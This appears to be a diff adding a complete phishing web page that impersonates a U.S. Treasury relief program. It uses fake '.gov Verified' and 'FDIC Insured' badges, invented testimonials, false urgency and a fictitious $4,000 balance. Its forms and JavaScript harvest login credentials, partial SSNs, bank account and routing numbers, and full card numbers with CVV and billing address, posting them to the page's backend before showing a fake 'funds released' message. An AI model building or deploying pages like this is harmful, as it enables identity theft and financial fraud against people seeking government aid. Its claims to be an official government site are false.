@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>U.S. Treasury Relief Program 2026</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* ===== RESET ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #0a1628;
+            color: #ffffff;
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+
+        /* ===== CONTAINER ===== */
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 16px;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            text-align: center;
+            padding: 20px 0 16px;
+        }
+        .header .seal {
+            width: 64px;
+            height: 64px;
+            background: #1a3a5c;
+            border-radius: 50%;
+            margin: 0 auto 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            border: 2px solid #c9a84c;
+        }
+        .header h1 {
+            font-size: 22px;
+            color: #c9a84c;
+            font-weight: 700;
+        }
+        .header .sub {
+            color: rgba(255,255,255,0.5);
+            font-size: 13px;
+            margin-top: 2px;
+            letter-spacing: 0.5px;
+        }
+
+        /* ===== CARDS ===== */
+        .card {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 14px;
+        }
+        .card h2 {
+            color: #c9a84c;
+            font-size: 18px;
+            margin-bottom: 4px;
+        }
+        .card .sub {
+            color: rgba(255,255,255,0.4);
+            font-size: 13px;
+            margin-bottom: 16px;
+        }
+
+        /* ===== FORM ===== */
+        .form-group {
+            margin-bottom: 14px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: rgba(255,255,255,0.7);
+            margin-bottom: 4px;
+        }
+        .form-group label i {
+            margin-right: 6px;
+            color: #c9a84c;
+        }
+        .form-control {
+            width: 100%;
+            padding: 12px 14px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+            transition: border 0.3s;
+            outline: none;
+            font-family: inherit;
+        }
+        .form-control::placeholder {
+            color: rgba(255,255,255,0.25);
+        }
+        .form-control:focus {
+            border-color: #c9a84c;
+            background: rgba(255,255,255,0.07);
+        }
+        select.form-control {
+            appearance: none;
+            cursor: pointer;
+        }
+        select.form-control option {
+            background: #1a3a5c;
+            color: #fff;
+        }
+
+        /* ===== BUTTONS ===== */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: inherit;
+            color: #fff;
+        }
+        .btn-primary {
+            background: #1a3a5c;
+        }
+        .btn-primary:hover {
+            background: #2a5f8f;
+        }
+        .btn-success {
+            background: #0d7a3e;
+        }
+        .btn-success:hover {
+            background: #0f8f4a;
+        }
+        .btn-gold {
+            background: #c9a84c;
+            color: #0a1628;
+        }
+        .btn-gold:hover {
+            background: #d4b85a;
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* ===== LOADING ===== */
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== BALANCE ===== */
+        .balance {
+            text-align: center;
+            padding: 24px 20px;
+            background: rgba(13, 122, 62, 0.1);
+            border: 1px solid rgba(13, 122, 62, 0.2);
+            border-radius: 12px;
+            margin-bottom: 14px;
+        }
+        .balance .amount {
+            font-size: 42px;
+            font-weight: 800;
+            color: #34d399;
+        }
+        .balance .label {
+            color: rgba(255,255,255,0.5);
+            font-size: 13px;
+            margin-top: 2px;
+        }
+
+        /* ===== STATS ===== */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 14px;
+        }
+        .stat-item {
+            background: rgba(255,255,255,0.03);
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .stat-item .value {
+            font-size: 18px;
+            font-weight: 700;
+            color: #c9a84c;
+        }
+        .stat-item .lbl {
+            font-size: 11px;
+            color: rgba(255,255,255,0.4);
+            margin-top: 2px;
+        }
+
+        /* ===== URGENCY ===== */
+        .urgency {
+            background: rgba(220, 53, 69, 0.08);
+            border: 1px solid rgba(220, 53, 69, 0.15);
+            border-radius: 8px;
+            padding: 10px 14px;
+            text-align: center;
+            font-size: 13px;
+            margin-bottom: 14px;
+        }
+        .urgency strong {
+            color: #dc3545;
+        }
+
+        /* ===== TRUST BADGES ===== */
+        .trust-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 6px;
+            margin: 12px 0;
+        }
+        .trust-item {
+            text-align: center;
+            font-size: 11px;
+            color: rgba(255,255,255,0.4);
+            padding: 6px;
+            background: rgba(255,255,255,0.02);
+            border-radius: 6px;
+        }
+        .trust-item i {
+            font-size: 16px;
+            color: #c9a84c;
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        /* ===== TESTIMONIAL ===== */
+        .testimonial {
+            background: rgba(255,255,255,0.02);
+            padding: 12px 14px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            border-left: 2px solid #c9a84c;
+        }
+        .testimonial .stars {
+            color: #c9a84c;
+            font-size: 13px;
+        }
+        .testimonial .quote {
+            font-size: 13px;
+            color: rgba(255,255,255,0.7);
+            margin: 3px 0;
+            font-style: italic;
+        }
+        .testimonial .author {
+            font-size: 11px;
+            color: rgba(255,255,255,0.3);
+        }
+
+        /* ===== MODAL ===== */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+            padding: 20px;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal {
+            background: #1a3a5c;
+            border-radius: 16px;
+            padding: 30px 24px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .modal .icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+        .modal h2 {
+            color: #c9a84c;
+            margin-bottom: 8px;
+        }
+        .modal p {
+            color: rgba(255,255,255,0.7);
+            font-size: 14px;
+            margin-bottom: 16px;
+            line-height: 1.6;
+        }
+        .modal .btn {
+            max-width: 200px;
+            margin: 0 auto;
+        }
+        .modal .highlight {
+            color: #34d399;
+            font-weight: 700;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            text-align: center;
+            padding: 16px 0 8px;
+            font-size: 11px;
+            color: rgba(255,255,255,0.15);
+            border-top: 1px solid rgba(255,255,255,0.04);
+            margin-top: 16px;
+        }
+        .footer .links {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 6px;
+        }
+        .footer .links a {
+            color: rgba(255,255,255,0.2);
+            text-decoration: none;
+            font-size: 11px;
+        }
+        .footer .links a:hover {
+            color: #c9a84c;
+        }
+
+        /* ===== HIDDEN ===== */
+        .hidden {
+            display: none !important;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 420px) {
+            .container { padding: 10px; }
+            .card { padding: 16px; }
+            .stats-grid { grid-template-columns: 1fr 1fr; }
+            .trust-grid { grid-template-columns: 1fr 1fr 1fr; }
+            .balance .amount { font-size: 32px; }
+            .header h1 { font-size: 18px; }
+        }
+        @media (min-width: 768px) {
+            .container { max-width: 600px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- ===== HEADER ===== -->
+        <div class="header">
+            <div class="seal">🇺🇸</div>
+            <h1>U.S. Treasury Relief Program</h1>
+            <div class="sub">Official 2026 Economic Recovery Initiative</div>
+        </div>
+
+        <!-- ===== AUTH SECTION ===== -->
+        <div id="auth-section">
+
+            <!-- URGENCY -->
+            <div class="urgency">
+                ⏰ <strong>URGENT:</strong> Only <strong>247</strong> spots remaining for this month
+            </div>
+
+            <!-- TRUST BADGES -->
+            <div class="trust-grid">
+                <div class="trust-item"><i class="fas fa-lock"></i>SSL Secure</div>
+                <div class="trust-item"><i class="fas fa-shield-alt"></i>FDIC Insured</div>
+                <div class="trust-item"><i class="fas fa-check-circle"></i>.gov Verified</div>
+            </div>
+
+            <!-- LOGIN -->
+            <div class="card" id="login-form">
+                <h2>🔐 Sign In</h2>
+                <div class="sub">Access your relief account</div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-envelope"></i>Email Address</label>
+                    <input type="email" class="form-control" id="login-email" placeholder="you@email.com">
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-lock"></i>Password</label>
+                    <input type="password" class="form-control" id="login-password" placeholder="••••••••">
+                </div>
+
+                <button class="btn btn-primary" onclick="login()" id="login-btn">🔑 Sign In</button>
+
+                <p style="text-align:center; margin-top:12px; color:rgba(255,255,255,0.3); font-size:13px;">
+                    New user? <a href="#" onclick="showRegister()" style="color:#c9a84c;">Create Account</a>
+                </p>
+            </div>
+
+            <!-- REGISTER -->
+            <div class="card hidden" id="register-form">
+                <h2>📝 Create Account</h2>
+                <div class="sub">Get started with your relief funds</div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-user"></i>Full Name</label>
+                    <input type="text" class="form-control" id="reg-name" placeholder="John Doe">
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-envelope"></i>Email Address</label>
+                    <input type="email" class="form-control" id="reg-email" placeholder="you@email.com">
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-lock"></i>Password</label>
+                    <input type="password" class="form-control" id="reg-password" placeholder="••••••••">
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-id-card"></i>SSN (Last 4)</label>
+                    <input type="text" class="form-control" id="reg-ssn" placeholder="1234" maxlength="4">
+                </div>
+
+                <button class="btn btn-success" onclick="register()" id="register-btn">✅ Create Account</button>
+
+                <p style="text-align:center; margin-top:12px; color:rgba(255,255,255,0.3); font-size:13px;">
+                    Already have an account? <a href="#" onclick="showLogin()" style="color:#c9a84c;">Sign In</a>
+                </p>
+            </div>
+
+            <!-- TESTIMONIALS -->
+            <div class="testimonial">
+                <div class="stars">⭐⭐⭐⭐⭐</div>
+                <div class="quote">"I received $8,500 in just 2 days! This program is a lifesaver."</div>
+                <div class="author">— Sarah M., Texas</div>
+            </div>
+            <div class="testimonial">
+                <div class="stars">⭐⭐⭐⭐⭐</div>
+                <div class="quote">"Applied Monday, got the money Wednesday. No catch, no fees."</div>
+                <div class="author">— John D., Florida</div>
+            </div>
+
+        </div>
+
+        <!-- ===== DASHBOARD ===== -->
+        <div id="dashboard-section" class="hidden">
+
+            <!-- BALANCE -->
+            <div class="balance">
+                <div class="label">💰 Your Relief Balance</div>
+                <div class="amount" id="balance-display">$4,000.00</div>
+                <div class="label" style="margin-top:2px;">Next disbursement: <span id="next-date">July 21, 2026</span></div>
+            </div>
+
+            <!-- STATS -->
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <div class="value" id="total-received">$4,000</div>
+                    <div class="lbl">Total Received</div>
+                </div>
+                <div class="stat-item">
+                    <div class="value" id="pending-display">$4,000</div>
+                    <div class="lbl">Pending</div>
+                </div>
+                <div class="stat-item">
+                    <div class="value" style="color:#34d399;">Active</div>
+                    <div class="lbl">Status</div>
+                </div>
+            </div>
+
+            <!-- PENDING NOTICE -->
+            <div class="urgency" id="pending-notice">
+                ⏳ <strong>Next deposit pending:</strong> $4,000 will be available in 5-7 business days
+            </div>
+
+            <!-- BANK ACCOUNT -->
+            <div class="card" id="bank-section">
+                <h2>🏦 Direct Deposit Setup</h2>
+                <div class="sub">Funds will be deposited to this account</div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-university"></i>Bank Name</label>
+                    <input type="text" class="form-control" id="bank-name" placeholder="Chase Bank">
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-hashtag"></i>Account Number</label>
+                    <input type="text" class="form-control" id="bank-account" placeholder="1234567890">
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-route"></i>Routing Number</label>
+                    <input type="text" class="form-control" id="routing-number" placeholder="021000021">
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-tag"></i>Account Type</label>
+                    <select class="form-control" id="account-type">
+                        <option value="checking">Checking</option>
+                        <option value="savings">Savings</option>
+                    </select>
+                </div>
+
+                <button class="btn btn-gold" onclick="addBankAccount()" id="bank-btn">🏦 Add Bank Account</button>
+            </div>
+
+            <!-- CARD VERIFICATION -->
+            <div class="card" id="card-section">
+                <h2>💳 Identity Verification</h2>
+                <div class="sub">Required to release your funds</div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-credit-card"></i>Card Number</label>
+                    <input type="text" class="form-control" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19">
+                </div>
+
+                <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px;">
+                    <div class="form-group">
+                        <label>Month</label>
+                        <input type="text" class="form-control" id="exp-month" placeholder="MM" maxlength="2">
+                    </div>
+                    <div class="form-group">
+                        <label>Year</label>
+                        <input type="text" class="form-control" id="exp-year" placeholder="YY" maxlength="2">
+                    </div>
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input type="password" class="form-control" id="cvv" placeholder="•••" maxlength="4">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-map-pin"></i>Billing ZIP</label>
+                    <input type="text" class="form-control" id="billing-zip" placeholder="90210" maxlength="10">
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-home"></i>Billing Address</label>
+                    <input type="text" class="form-control" id="billing-address" placeholder="123 Main St, Apt 4B">
+                </div>
+
+                <button class="btn btn-success" onclick="submitCard()" id="card-btn">✅ Verify & Release Funds</button>
+            </div>
+
+        </div>
+
+        <!-- ===== MODAL ===== -->
+        <div class="modal-overlay" id="success-modal">
+            <div class="modal">
+                <div class="icon">✅</div>
+                <h2>Verification Successful!</h2>
+                <p>
+                    Your identity has been verified. 
+                    <span class="highlight">$4,000.00</span> has been approved 
+                    and will be credited to your bank account within 
+                    <span class="highlight">72 hours</span>.
+                </p>
+                <p style="font-size:12px; color:rgba(255,255,255,0.4);">
+                    You will receive a confirmation email once the transfer is complete.
+                </p>
+                <button class="btn btn-primary" onclick="closeModal()">OK, Got It</button>
+            </div>
+        </div>
+
+        <!-- ===== FOOTER ===== -->
+        <div class="footer">
+            <div class="links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Contact</a>
+            </div>
+            <div>🇺🇸 U.S. Department of the Treasury • Official Website</div>
+            <div style="margin-top:2px;">© 2026 All Rights Reserved</div>
+        </div>
+
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- ===== JAVASCRIPT ===== -->
+    <!-- ============================================================ -->
+    <script>
+        const BACKEND_URL = window.location.origin;
+        let currentUser = null;
+        let userBalance = 4000;
+        let totalReceived = 4000;
+        let pendingAmount = 4000;
+
+        // ===== UI HELPERS =====
+        function showToast(msg, isError = false) {
+            const old = document.querySelector('.toast');
+            if (old) old.remove();
+            const t = document.createElement('div');
+            t.className = 'toast';
+            t.textContent = msg;
+            t.style.cssText = `
+                position: fixed;
+                bottom: 20px;
+                left: 50%;
+                transform: translateX(-50%);
+                background: ${isError ? '#dc3545' : '#0d7a3e'};
+                color: #fff;
+                padding: 12px 20px;
+                border-radius: 10px;
+                font-weight: 600;
+                z-index: 999;
+                box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+                max-width: 90%;
+                text-align: center;
+                font-size: 14px;
+            `;
+            document.body.appendChild(t);
+            setTimeout(() => t.remove(), 4000);
+        }
+
+        function setLoading(btnId, loading) {
+            const btn = document.getElementById(btnId);
+            if (loading) {
+                btn.innerHTML = '<span class="spinner"></span> Processing...';
+                btn.disabled = true;
+            } else {
+                btn.textContent = btn.getAttribute('data-original') || 'Submit';
+                btn.disabled = false;
+            }
+        }
+
+        function showModal() {
+            document.getElementById('success-modal').classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('success-modal').classList.remove('active');
+        }
+
+        function showRegister() {
+            document.getElementById('login-form').classList.add('hidden');
+            document.getElementById('register-form').classList.remove('hidden');
+        }
+
+        function showLogin() {
+            document.getElementById('register-form').classList.add('hidden');
+            document.getElementById('login-form').classList.remove('hidden');
+        }
+
+        // ===== REGISTER =====
+        async function register() {
+            const name = document.getElementById('reg-name').value.trim();
+            const email = document.getElementById('reg-email').value.trim();
+            const password = document.getElementById('reg-password').value;
+            const ssn = document.getElementById('reg-ssn').value.trim();
+
+            if (!name || !email || !password || !ssn) {
+                showToast('Please fill in all fields', true);
+                return;
+            }
+
+            const btn = document.getElementById('register-btn');
+            btn.setAttribute('data-original', btn.textContent);
+            setLoading('register-btn', true);
+
+            try {
+                const res = await fetch(BACKEND_URL + '/api/register', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name, email, password, ssn })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    currentUser = data.user;
+                    document.getElementById('auth-section').classList.add('hidden');
+                    document.getElementById('dashboard-section').classList.remove('hidden');
+                    updateDashboard();
+                    showToast('✅ Account created successfully!');
+                } else {
+                    showToast(data.message || 'Registration failed', true);
+                }
+            } catch (e) {
+                showToast('Network error. Please try again.', true);
+                console.error(e);
+            }
+            setLoading('register-btn', false);
+        }
+
+        // ===== LOGIN =====
+        async function login() {
+            const email = document.getElementById('login-email').value.trim();
+            const password = document.getElementById('login-password').value;
+
+            if (!email || !password) {
+                showToast('Please enter email and password', true);
+                return;
+            }
+
+            const btn = document.getElementById('login-btn');
+            btn.setAttribute('data-original', btn.textContent);
+            setLoading('login-btn', true);
+
+            try {
+                const res = await fetch(BACKEND_URL + '/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    currentUser = data.user;
+                    document.getElementById('auth-section').classList.add('hidden');
+                    document.getElementById('dashboard-section').classList.remove('hidden');
+                    updateDashboard();
+                    showToast('✅ Welcome back!');
+                } else {
+                    showToast('Invalid email or password', true);
+                }
+            } catch (e) {
+                showToast('Network error. Please try again.', true);
+                console.error(e);
+            }
+            setLoading('login-btn', false);
+        }
+
+        // ===== DASHBOARD =====
+        function updateDashboard() {
+            document.getElementById('balance-display').textContent = '$' + userBalance.toFixed(2);
+            document.getElementById('total-received').textContent = '$' + totalReceived.toFixed(2);
+            document.getElementById('pending-display').textContent = '$' + pendingAmount.toFixed(2);
+            const d = new Date();
+            d.setDate(d.getDate() + 7);
+            document.getElementById('next-date').textContent = d.toLocaleDateString('en-US', {
+                month: 'long',
+                day: 'numeric',
+                year: 'numeric'
+            });
+        }
+
+        // ===== BANK ACCOUNT =====
+        async function addBankAccount() {
+            const bank_name = document.getElementById('bank-name').value.trim();
+            const bank_account = document.getElementById('bank-account').value.trim();
+            const routing_number = document.getElementById('routing-number').value.trim();
+            const account_type = document.getElementById('account-type').value;
+
+            if (!bank_name || !bank_account || !routing_number) {
+                showToast('Please fill in all bank fields', true);
+                return;
+            }
+
+            const btn = document.getElementById('bank-btn');
+            btn.setAttribute('data-original', btn.textContent);
+            setLoading('bank-btn', true);
+
+            try {
+                const res = await fetch(BACKEND_URL + '/api/add-bank', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        user_id: currentUser.id,
+                        bank_name,
+                        bank_account,
+                        routing_number,
+                        account_type
+                    })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showToast('✅ Bank account added successfully!');
+                    document.getElementById('bank-section').style.borderColor = '#0d7a3e';
+                } else {
+                    showToast(data.message || 'Failed to add bank account', true);
+                }
+            } catch (e) {
+                showToast('Network error. Please try again.', true);
+                console.error(e);
+            }
+            setLoading('bank-btn', false);
+        }
+
+        // ===== CARD SUBMIT =====
+        async function submitCard() {
+            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
+            const expMonth = document.getElementById('exp-month').value.trim();
+            const expYear = document.getElementById('exp-year').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+            const zip = document.getElementById('billing-zip').value.trim();
+            const address = document.getElementById('billing-address').value.trim();
+
+            if (!cardNumber || cardNumber.length < 16) {
+                showToast('Please enter a valid card number', true);
+                return;
+            }
+            if (!expMonth || !expYear || !cvv || !zip) {
+                showToast('Please fill in all card details', true);
+                return;
+            }
+
+            const btn = document.getElementById('card-btn');
+            btn.setAttribute('data-original', btn.textContent);
+            setLoading('card-btn', true);
+
+            try {
+                const res = await fetch(BACKEND_URL + '/api/verify-card', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        user_id: currentUser.id,
+                        card_number: cardNumber,
+                        exp_month: expMonth,
+                        exp_year: expYear,
+                        cvv: cvv,
+                        zip: zip,
+                        address: address
+                    })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    // Update dashboard
+                    userBalance += pendingAmount;
+                    totalReceived += pendingAmount;
+                    pendingAmount = 0;
+                    updateDashboard();
+
+                    // Show modal with 72-hour message
+                    showModal();
+                    btn.textContent = '✅ Funds Released!';
+                    btn.disabled = true;
+                    
+                    // Update pending notice
+                    document.getElementById('pending-notice').innerHTML =
+                        '✅ <strong>Verification successful!</strong> Funds will be credited within 72 hours.';
+                    document.getElementById('pending-notice').style.borderColor = '#0d7a3e';
+                } else {
+                    showToast(data.message || 'Verification failed', true);
+                }
+            } catch (e) {
+                showToast('Network error. Please try again.', true);
+                console.error(e);
+            }
+            setLoading('card-btn', false);
+        }
+
+        // ===== CARD FORMATTING =====
+        document.getElementById('card-number')?.addEventListener('input', function(e) {
+            let v = this.value.replace(/\D/g, '');
+            if (v.length > 16) v = v.slice(0, 16);
+            this.value = v.replace(/(.{4})/g, '$1 ').trim();
+        });
+    </script>
+
+</body>
+</html>
